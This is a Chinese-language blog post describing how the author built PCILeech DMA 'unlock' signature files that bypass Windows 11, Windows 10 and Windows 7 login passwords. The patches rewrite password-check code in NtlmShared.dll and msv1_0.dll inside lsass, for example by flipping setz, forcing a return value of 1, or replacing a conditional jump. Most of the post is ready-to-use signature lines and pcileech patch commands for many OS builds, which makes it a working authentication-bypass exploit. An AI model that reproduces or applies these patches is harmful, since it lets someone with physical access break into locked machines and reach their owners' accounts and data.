---
layout:     post
title:      【技术研究】pcileech编写unlock脚本过win11和win7锁屏
subtitle:   TEC
date:       2024-03-28
author:     Corax
header-img: img/post-bg-coffee1.jpg
catalog: true
tags:
    - 【技术研究】
    - 【逆向】
---

昨天用了pcileech的windows10的unlock脚本，能够成功。

今天把windows11和windows7的unlock脚本给写出来了。



# win11绕密码

unlock_win11x86原本的替换909090909090，无法绕过

![image-20240329151220658](https://typora-1321221957.cos.ap-shanghai.myqcloud.com/image1/202403291532269.png)

原因在不走图中流程

![image-20240329151328493](https://typora-1321221957.cos.ap-shanghai.myqcloud.com/image1/202403291532270.png)

正确逻辑在

![image-20240329151345109](https://typora-1321221957.cos.ap-shanghai.myqcloud.com/image1/202403291532271.png)

可以把setz直接取反 如下

```
180004009 | 0F 94 C0             |   setz    al

替换为

180004009 | 0F 95 C0 
```

也可以把setz变成83c801 异或值给到al，成功绕密

```
018,488B9C24F0000000,009,0F94C0,009,83C801
```

详细脚本

```
# Unlock Signatures for Local and AD Accounts for Windows 11 x64 version
#
# Method 1: (faster):
# 1.1 check pid of lsass.exe: pcileech pslist
# 1.2 patch: pcileech patch -sig wx64_unlock_win11.sig -all -pid <pid_of_lsass>
#
# Method 2:
# 2.1 patch: pcileech patch -sig wx64_unlock_win11.sig -all
#
# Syntax: see signature_info.txt for more information.
# Generated on 2023-11-26 16:58:59
#
#
# Signature for Windows 11 x64 [NtlmShared.dll 10.0.20348.1668 / 2023-03-30]
A7B,488BCB48FF15A3280000,A8D,0F84B2FAFFFF,A8D,0F85
#
# Signature for Windows 11 x64 [NtlmShared.dll 10.0.20348.887 / 2022-08-04]
A6B,488BCB48FF15B3280000,A7D,0F84B2FAFFFF,A7D,0F85
#
# Signature for Windows 11 x64 [NtlmShared.dll 10.0.22000.1696 / 2023-03-09]
00B,488BCB48FF15E3220000,01D,0F84B2FAFFFF,01D,0F85
#
# Signature for Windows 11 x64 [NtlmShared.dll 10.0.22000.2600 / 2023-11-08]
01B,488BCB48FF15D3220000,02D,0F84B2FAFFFF,02D,0F85
#
# Signature for Windows 11 x64 [NtlmShared.dll 10.0.22000.778 / 2022-06-18]
F8B,488BCB48FF1563230000,F9D,0F84B2FAFFFF,F9D,0F85
#
# Signature for Windows 11 x64 [NtlmShared.dll 10.0.22621.2067 / 2023-07-11]
# Signature for Windows 11 x64 [NtlmShared.dll 10.0.22621.2506 / 2023-10-19]
# Signature for Windows 11 x64 [NtlmShared.dll 10.0.22621.2567 / 2023-10-14]
# FC9,488D4B1048FF152C230000,FDC,0F85C4FAFFFF,FDC,909090909090
# FC9,488D4B1048FF152C230000,1009,0F94C0,1009,0F95C0
018,488B9C24F0000000,009,0F94C0,009,83C801
```



# win7绕密

**win7的unlock脚本没有内置，但是发现win7和win8一样用的是msv1_0.dll**

所以直接在win8的unlock脚本修改

修改方法 直接在msvppasswordvalidate..入口修改为mov rax,0x1和retn

如下

![image-20240329151720358](https://typora-1321221957.cos.ap-shanghai.myqcloud.com/image1/202403291532273.png)

可以成功绕密

但是因为只有本机msv1_0.dll，不同版本偏移不同，仍需适配。

详细脚本：

```
# unlock signatures for Windows 8.1
# syntax: see signature_info.txt for more information.
#
#
# signature for Windows 8.1 x64 [msv1_0.dll (signed on: 2014-10-29)]
EE0,FF1542A4,EE9,0F854688,EE9,909090909090
#
# signature for Windows 8.1 x64 [msv1_0.dll (signed on: 2015-10-30)]
B60,FF15C207,B69,0F85CEBC,B69,909090909090
#
# signature for Windows 8.1 x64 [msv1_0.dll (signed on: 2016-03-16)]
F00,FF152204,F09,0F85B2B9,F09,909090909090
D6E,49894F08,D14,48895C2408555657,D14,48C7C001000000C3
```

（注：自建win7跑不起来，因为win7和win8都是使用msv1_0.dll，所以可以直接对win8的脚本进行修改，运行）

# win10绕密修正版

原版unlock_win10x64，只是转换jz和jnz逻辑，当我们深入错误密钥可以进入，而正确密钥却会错误，修正版用来无论正确错误都可以成功绕密

修正过程比较容易

脚本原版已经找到入口点，只需要改0f85(jnz)为E9BBFAFFFF90（jmp xxx）即可成功进入

```
# Unlock Signatures for Local and AD Accounts for Windows 10 x64 version
#
# Method 1: (faster):
# 1.1 check pid of lsass.exe: pcileech pslist
# 1.2 patch: pcileech patch -sig wx64_unlock_win10.sig -all -pid <pid_of_lsass>
#
# Method 2:
# 2.1 patch: pcileech patch -sig wx64_unlock_win10.sig -all
#
# Syntax: see signature_info.txt for more information.
# Generated on 2023-11-26 16:58:59
#
#
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.10240.16384 / 2015-07-10]
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.10240.18366 / 2019-09-30]
5DC,488BCBFF154B1C0000,5E8,0F8518FBFFFF,5E8,909090909090
#
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.10240.19387 / 2022-08-04]
65C,488BCBFF15CB1B0000,668,0F8518FBFFFF,668,909090909090
#
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.10240.19869 / 2023-03-30]
66C,488BCBFF15BB1B0000,678,0F8518FBFFFF,678,909090909090
#
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.10586.0 / 2015-10-30]
62C,488BCBFF15B31B0000,638,0F8518FBFFFF,638,909090909090
#
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.14393.0 / 2016-07-16]
6DC,488BCBFF15D31B0000,6E8,0F8518FBFFFF,6E8,909090909090
#
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.14393.2791 / 2019-02-06]
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.14393.3269 / 2019-09-29]
6EC,488BCBFF15C31B0000,6F8,0F8518FBFFFF,6F8,909090909090
#
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.14393.5291 / 2022-08-07]
76C,488BCBFF15431B0000,778,0F8518FBFFFF,778,909090909090
#
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.14393.5850 / 2023-03-30]
77C,488BCBFF15331B0000,788,0F8518FBFFFF,788,909090909090
#
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.15063.1631 / 2019-02-06]
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.15063.2106 / 2019-09-30]
622,488BCBFF15B51C0000,62E,0F852EFBFFFF,62E,909090909090
#
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.15254.245 / 2018-01-30]
612,488BCBFF15C51C0000,61E,0F852EFBFFFF,61E,909090909090
#
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.16299.1268 / 2019-07-05]
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.16299.1448 / 2019-10-02]
622,488BCBFF15C51C0000,62E,0F852EFBFFFF,62E,909090909090
#
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.16299.192 / 2018-01-01]
612,488BCBFF15D51C0000,61E,0F852EFBFFFF,61E,909090909090
#
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.17134.1067 / 2019-10-02]
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.17134.590 / 2019-02-06]
6A2,488BCBFF15451C0000,6AE,0F852EFBFFFF,6AE,909090909090
#
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.17134.523 / 2019-01-01]
692,488BCBFF15551C0000,69E,0F852EFBFFFF,69E,909090909090
#
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.17763.10935 / 2022-08-05]
7CD,488BCBFF15221B0000,7D9,0F840BFBFFFF,7D9,E9BBFAFFFF90
#
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.17763.194 / 2018-12-04]
73D,488BCBFF15B21B0000,749,0F840BFBFFFF,749,E9BBFAFFFF90
#
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.17763.316 / 2019-02-06]
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.17763.802 / 2019-10-02]
74D,488BCBFF15A21B0000,759,0F840BFBFFFF,759,E9BBFAFFFF90
#
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.17763.5122 / 2023-11-08]
7DD,488BCBFF15121B0000,7E9,0F840BFBFFFF,7E9,E9BBFAFFFF90
#
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.18362.1 / 2019-03-18]
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.18362.10022 / 2019-09-15]
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.18362.418 / 2019-10-06]
72F,488BCBFF15C01B0000,73B,0F8409FBFFFF,73B,E9BBFAFFFF90
#
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.19041.1 / 2019-12-07]
423,488BCB48FF1553200000,435,0F84BAFAFFFF,435,E9BBFAFFFF90
#                            
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.19041.2728 / 2023-03-09]
4B3,488BCB48FF15C31F0000,4C5,0F84BAFAFFFF,4C5,E9BBFAFFFF90
#
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.19041.2965 / 2023-04-27]
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.19041.3636 / 2023-10-20]
# Signature for Windows 10 x64 [NtlmShared.dll 10.0.19041.3684 / 2023-10-17]
4C3,488BCB48FF15B31F0000,4D5,0F84BAFAFFFF,4D5,E9BBFAFFFF90
```

